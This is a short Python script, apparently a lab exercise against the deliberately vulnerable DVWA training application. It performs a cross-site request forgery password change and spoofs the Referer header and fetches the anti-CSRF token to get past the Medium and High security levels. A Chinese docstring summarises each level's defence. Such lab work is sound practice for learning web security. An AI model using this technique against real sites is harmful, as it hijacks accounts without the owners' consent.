from dvwa import DVWA

SECURITY = "high"
NEW_PASSWORD = "password"
"""
会修改当前登录用户的密码, 默认改成和原密码一样, 避免把自己锁在外面.
换成任意新密码再运行即可真正修改.
Low: GET 请求, 没有任何校验
Medium: 校验 Referer 是否来自本机
High: 需要 user_token
"""

target = DVWA("csrf", SECURITY)

params = {
    "password_new": NEW_PASSWORD,
    "password_conf": NEW_PASSWORD,
    "Change": "Change",
}
if SECURITY == "high":
    params["user_token"] = target.token()

response = target.get(
    "",
    params=params,
    headers={"Referer": target.url},
)

if "Password Changed" in response.text:
    print(f"Password changed to: {NEW_PASSWORD}")
elif "didn't look correct" in response.text:
    print("Rejected: Referer check failed.")
else:
    print("Rejected: check the session and security level.")
